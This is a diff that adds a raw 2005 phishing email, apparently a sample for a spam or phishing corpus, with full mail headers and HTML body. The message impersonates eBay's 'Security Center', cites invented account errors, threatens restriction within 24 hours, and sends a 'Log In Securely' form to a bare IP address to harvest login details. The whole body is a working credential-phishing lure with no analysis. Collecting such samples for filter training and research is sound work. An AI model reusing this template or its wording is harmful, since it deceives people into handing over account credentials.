@@ -1,0 +1,68 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id BADBD2A88C
+	for <user@example.com>; Sun, 18 Sep 2005 03:00:07 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id B410A621C89; Sun, 18 Sep 2005 03:00:07 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 9425E621C78
+	for <user@example.com>; Sun, 18 Sep 2005 03:00:07 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id DAA22313
+	for user@example.com; Sun, 18 Sep 2005 03:00:07 -0400
+Received: from www.ihostingshop.net (ev1s-216-40-197-150.ev1servers.net [216.40.197.150] (may be forged))
+	by mail.example.com with ESMTP id DAA22305
+	for <user@example.com>; Sun, 18 Sep 2005 03:00:06 -0400
+Received: (from httpd@localhost)
+	by www.ihostingshop.net (8.10.2/8.10.2) id j8I88V424689;
+	Sun, 18 Sep 2005 18:08:31 +1000
+Date: Sun, 18 Sep 2005 18:08:31 +1000
+Message-Id: <200509180808.j8I88V424689@www.ihostingshop.net>
+To: user@example.com
+Subject: TKO NOTICE: eBay Registration Suspension -Section 9- 
+From: eBay Security Center <aw-confirm@ebay.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Content-Length: 3829
+Lines: 32
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 145
+
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD width=150><IMG style="WIDTH: 141px; HEIGHT: 56px" height=78 alt="From collectibles to cars, buy and sell all kinds of items on eBay" src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif" width=171 border=0> </TD>
+<TD vAlign=top align=right width=450><MAP name=home_myebay_map_hasJS><AREA shape=RECT target=_blank alt=Home coords=209,0,256,15 href="http://pages.ebay.com/index.html"><AREA shape=RECT target=_blank alt="My eBay" coords=257,0,318,15 href="http://cgi1.ebay.com/aw-cgi/eBayISAPI.dll?MyEbayLogin"><AREA shape=RECT target=_blank alt="Site Map" coords=319,0,383,15 href="http://pages.ebay.com/sitemap.html"><AREA shape=RECT target=_blank alt="Sign In/Out" coords=384,0,447,15 href="http://cgi3.ebay.com/aw-cgi/eBayISAPI.dll?SignIn"></MAP><MAP name=home_myebay_map_noJS><AREA shape=RECT target=_blank alt=Home coords=198,0,245,15 href="http://pages.ebay.com/index.html"><AREA shape=RECT target=_blank alt="My eBay" coords=246,0,307,15 href="http://cgi1.ebay.com/aw-cgi/eBayISAPI.dll?MyEbayLogin"><AREA shape=RECT target=_blank alt="Site Map" coords=308,0,372,15 href="http://pages.ebay.com/sitemap.html"><AREA shape=RECT target=_blank alt="Sign In/Out" coords=373,0,447,15 href="http://cgi3.eba!
+! !!y .com/aw-cgi/eBayISAPI.dll?SignIn"></MAP></TD></TR></TBODY></TABLE>
+<P align=left>Dear eBay customer,</P>
+<P>During our regularly scheduled account maintenance and verification procedures, we've detected a slight error in your informations.</P>
+<P>This might be due to either of the following reasons:</P>
+<P><STRONG>1.</STRONG> A recent change in your personal information ( i.e.change of address).<BR><STRONG>2.</STRONG> Submiting invalid information during the initial sign up process.<BR><STRONG>3.</STRONG> An inability to accurately verify your selected option of payment due to an internal error within our processors.<BR><STRONG>4. </STRONG>Fraud Alert - Somone tried to sign in to eBay but not successful.</P>
+<P>Please update and verify your information by clicking below : </P>
+<P>
+<FORM onclick="return ShowLinkWarning()" action=http://149.156.166.7/news/.securesite/index.html target=_blank onfiltered="return ShowLinkWarning()"><INPUT type=submit value="Log In Securely>" form ;<></A></FONT> </P>
+<P></P>
+<P>If your account information is not updated within <STRONG>24 hours</STRONG> then your ability to sell or bid on eBay will become restricted.</P>
+<P>Thank you</P>
+<P>The eBay Billing Deptartment . </P>
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD colSpan=2>
+<DIV align=center></DIV>
+<HR align=center width=500>
+
+<P><BR></P></TD></TR>
+<TR>
+<TD vAlign=top align=left width=450 height=31><FONT size=-1><FONT size=-2><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1>Copyright © 1995-2005 eBay Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>Use of this Web site constitutes acceptance of the eBay <A href="http://pages.ebay.com/help/policies/user-agreement.html" target=_blank onfiltered="return openHelpWindow(this.href);"><FONT color=#003399>User Agreement</FONT></A> and <A href="http://pages.ebay.com/help/policies/privacy-policy.html" target=_blank onfiltered="return openHelpWindow(this.href);"><FONT color=#003399>Privacy Policy</FONT></A>.</FONT></FONT></FONT><BR></TD>
+<TD vAlign=top align=right width=150 height=31><FONT face="Arial, Verdana, Helvetica, sans-serif" size=1><A href="http://pages.ebay.com/help/policies/privacy-policy.html" target=_blank onfiltered="return openHelpWindow(this.href);"><IMG height=31 alt=TrustE src="http://pics.ebaystatic.com/aw/pics/truste_button.gif" width=116 align=middle border=0></A></FONT></TD></TR></TBODY></TABLE></P></FORM></DIV>eBay Security Center
+
+
+
